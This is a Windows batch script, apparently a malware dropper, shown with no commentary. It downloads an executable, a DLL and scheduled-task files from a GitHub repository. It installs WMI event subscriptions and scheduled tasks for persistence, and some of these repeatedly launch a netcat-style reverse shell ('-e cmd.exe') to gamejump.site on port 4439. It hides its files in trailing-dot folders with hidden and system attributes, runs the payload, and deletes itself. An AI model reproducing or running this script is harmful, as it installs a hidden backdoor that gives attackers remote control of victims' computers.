@echo off
taskkill /f /IM WmiPrv.exe /t
attrib -h -s -r C:\ProgramData\Packag /d /s
schtasks /Delete /TN "\GoogleUbtat" /F
schtasks /Delete /TN "\DirectUpdate" /F
schtasks /Delete /TN "\UpdateDirect" /F
rd \\.\C:\ProgramData\Package..\ /S /Q
rd C:\ProgramData\Packag /S /Q 
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="pers"' DELETE
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nut" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nut"' DELETE
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="per"' DELETE
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="nur" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="nur"' DELETE
mkdir C:\ProgramData\Packag
mkdir \\.\C:\ProgramData\Package..\
powershell.exe iwr https://github.com/wazgame/waz/raw/main/AutoUpdate.xml -OutFile C:\ProgramData\AutoUpdate.xml
powershell.exe iwr https://github.com/wazgame/waz/raw/main/DirectUpdate.xml -OutFile C:\ProgramData\DirectUpdate.xml
powershell.exe iwr https://github.com/wazgame/waz/raw/main/UpdateDirect.xml -OutFile C:\ProgramData\UpdateDirect.xml
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\d3dcompiler_47.dll", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\d3dcompiler_47.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="pers"", Consumer="CommandLineEventConsumer.Name="pers""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nut", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nut", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe", CommandLineTemplate="C:\ProgramData\NUL..\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="nut"", Consumer="CommandLineEventConsumer.Name="nut""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="per", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 660 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="per", CommandLineTemplate="C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\d3dcompiler_47.dll", CommandLineTemplate="C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\d3dcompiler_47.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="per"", Consumer="CommandLineEventConsumer.Name="per""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nur", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nur", CommandLineTemplate="C:\ProgramData\USOShared\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe", CommandLineTemplate="C:\ProgramData\USOShared\StartMenuExperienceHost.exe gamejump.site 4439 -e cmd.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="nur"", Consumer="CommandLineEventConsumer.Name="nur""
schtasks /create /xml "C:\ProgramData\AutoUpdate.xml" /tn "\AutoUpdate"
schtasks /create /xml "C:\ProgramData\DirectUpdate.xml" /tn "\DirectUpdate"
schtasks /create /xml "C:\ProgramData\UpdateDirect.xml" /tn "\UpdateDirect"
powershell.exe iwr https://github.com/wazgame/waz/raw/main/WmiPrv.exe -OutFile C:\ProgramData\Packag\WmiPrv.exe
powershell.exe iwr https://github.com/wazgame/waz/raw/main/d3dcompiler_47.dll -OutFile C:\ProgramData\Packag\d3dcompiler_47.dll
copy C:\ProgramData\Packag\WmiPrv.exe \\.\C:\ProgramData\Package..\WmiPrv.exe
copy C:\ProgramData\Packag\d3dcompiler_47.dll \\.\C:\ProgramData\Package..\d3dcompiler_47.dll
attrib +h +s +r C:\ProgramData\Packag
del /S /Q C:\ProgramData\AutoUpdate.xml && del /S /Q C:\ProgramData\DirectUpdate.xml && del /S /Q C:\ProgramData\UpdateDirect.xml
C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\d3dcompiler_47.dll
del/a/f "%~f0"